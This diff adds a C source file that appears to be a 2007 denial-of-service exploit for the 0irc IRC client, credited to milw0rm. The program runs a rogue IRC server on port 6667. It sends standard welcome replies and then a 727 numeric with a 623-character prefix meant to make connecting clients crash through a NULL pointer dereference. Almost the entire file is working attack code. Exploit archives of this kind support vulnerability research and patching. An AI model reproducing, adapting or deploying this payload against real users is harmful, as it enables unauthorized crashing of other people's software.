@@ -1,0 +1,130 @@
+/*
+	0irc-client v1345 build 20060823 DoS Exploit By DiGitalX (DiGi7alX@Gmail.com)
+	Date: 22/3/2007 -- MicroSystem Team -- Site: http://DiGitalX.I.am
+	Description: 0irc-client suffers from a NULL pointer derefrencing bug.
+*/
+
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#pragma comment(lib, "wsock32.lib")
+
+// `perl -e "print 'a' x 623";`
+#define As "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+
+int main()
+{
+	struct sockaddr_in sa, nsa;
+	SOCKET s, ns;
+	WSADATA wsa;
+	int err, val;
+	char buffer[1000]; /* evil buffer holder */
+
+	printf("0irc-client v1345 build 20060823 DoS Exploit By DiGitalX\n");
+	printf("MicroSystem Team -- Date: 22/3/2007 -- http://DiGitalX.I.am\n");
+	printf("Contact: DiGi7alX@Gmail.com\n\n");
+
+	printf("Initializing...\n");
+
+	/* first open the ircd */
+	//fire up winsock
+	if ((err = WSAStartup(MAKEWORD(1, 1), &wsa)) != 0) {
+		//if winsock is sick :P
+		printf("Error: Cannot initialize winsock (%d).\n", err);
+		return 1;
+	}
+	//create a socket
+	s = socket(AF_INET, SOCK_STREAM, 0);
+	if (s == INVALID_SOCKET) {
+		//if socket cannot be created inform user
+		printf("Error: Cannot create socket (%d).\n", WSAGetLastError());
+		return 1;
+	}
+	//starting building the sockaddr_in struct
+	memset(&sa, 0, sizeof(sa));
+	sa.sin_family = AF_INET;
+	sa.sin_addr.S_un.S_addr = INADDR_ANY;
+	sa.sin_port = htons(6667); /* default ircd port */
+	//now bind the socket to the port
+	if (bind(s, (const struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
+		//if bind error inform user
+		printf("Error: Cannot bind socket to port 6667 (%d).\n", WSAGetLastError());
+		return 1;
+	}
+	//do listen for incoming connections
+	if (listen(s, SOMAXCONN) == SOCKET_ERROR) {
+		//cannot listen tell user
+		printf("Error: Cannot listen for incoming connections (%d).\n", WSAGetLastError());
+		return 1;
+	}
+	//listen OK
+	//set sockaddr_in structcure size
+	val = sizeof(nsa);
+	//now do accept clients
+	printf("Now connect using 0irc client.\n");
+	if ((ns = accept(s, (struct sockaddr *)&nsa, &val)) == INVALID_SOCKET) {
+		//if accept fails
+		printf("Error: Cannot accept incoming connection (%d).\n", WSAGetLastError());
+		return 1;
+	}
+	//accept OK .. inform user of new connection
+	printf("New Connection: %s\n", inet_ntoa(nsa.sin_addr));
+	//now the real job begins :D
+	snprintf(buffer, sizeof(buffer)-1, ":aaa 001 DiGitalX\r\n\0");
+	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
+		//oops!! error
+		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
+		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
+		return 1;
+	}
+	snprintf(buffer, sizeof(buffer)-1, ":aaa 002 DiGitalX\r\n\0");
+	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
+		//oops!! error
+		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
+		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
+		return 1;
+	}
+	snprintf(buffer, sizeof(buffer)-1, ":aaa 003 DiGitalX\r\n\0");
+	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
+		//oops!! error
+		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
+		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
+		return 1;
+	}
+	snprintf(buffer, sizeof(buffer)-1, ":aaa 004 DiGitalX\r\n\0");
+	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
+		//oops!! error
+		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
+		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
+		return 1;
+	}
+	snprintf(buffer, sizeof(buffer)-1, ":aaa 005 DiGitalX\r\n\0");
+	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
+		//oops!! error
+		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
+		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
+		return 1;
+	}
+	snprintf(buffer, sizeof(buffer)-1, ":"As" 727 DiGitalX\r\n\0");
+	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
+		//oops!! error
+		if (err == SOCKET_ERROR) printf("Error: Cannot send evil buffer (%d).\n", WSAGetLastError());
+		else printf("Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n", err, strlen(buffer));
+		return 1;
+	}
+	//wait sometime
+	Sleep(1200);
+	//cleanup
+	//close sockets
+	closesocket(ns);
+	closesocket(s);
+	//close winsock
+	WSACleanup();
+
+	return 0; /* end of work :D */
+}
+
+// milw0rm.com [2007-03-22]
